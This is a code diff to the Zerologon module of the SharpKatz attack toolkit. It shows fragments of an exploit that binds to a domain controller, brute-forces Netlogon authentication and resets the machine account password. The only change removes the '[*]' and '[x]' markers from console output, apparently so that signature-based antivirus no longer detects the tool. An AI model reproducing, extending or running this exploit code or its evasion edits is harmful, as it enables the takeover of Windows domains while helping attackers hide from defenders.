@@ -81,7 +81,7 @@ namespace SharpKatz.Module
         public static bool RunZerologon(string mode, string target, string machineaccount, int auth, bool nullsession)
         {
             bool success = false;
-            Console.Write("[*] ");
+            Console.Write("   ");
 
 
             rpcConn = DCSync.CreateBinding(target, null, auth, nullsession: nullsession);
@@ -96,7 +96,7 @@ namespace SharpKatz.Module
 
             if (rpcStatus != NTSTATUS.Success)
             {
-                Console.WriteLine("[x] Error RpcEpResolveBinding {0}", (int)rpcStatus);
+                Console.WriteLine("   Error RpcEpResolveBinding {0}", (int)rpcStatus);
 
                 return false;
             }
@@ -109,8 +109,8 @@ namespace SharpKatz.Module
                     Console.Write("=");
                 else
                 {
-                    Console.WriteLine("[*]");
-                    Console.WriteLine("[*] Authentication: Ok target vulnerable");
+                    Console.WriteLine("  ");
+                    Console.WriteLine("   Authentication: Ok target vulnerable");
 
                     if (!mode.Equals("check"))
                     {
@@ -118,7 +118,7 @@ namespace SharpKatz.Module
 
                         if (status == NTSTATUS.Success)
                         {
-                            Console.WriteLine("[*] Set password: Ok");
+                            Console.WriteLine("   Set password: Ok");
                             return true;
 
                         }
@@ -168,7 +168,7 @@ namespace SharpKatz.Module
 
                 if (rpcStatus == NTSTATUS.Success)
                 {
-                    Console.WriteLine("\n[*]");
+                    Console.WriteLine("\n  ");
 
                     return true;
                 }
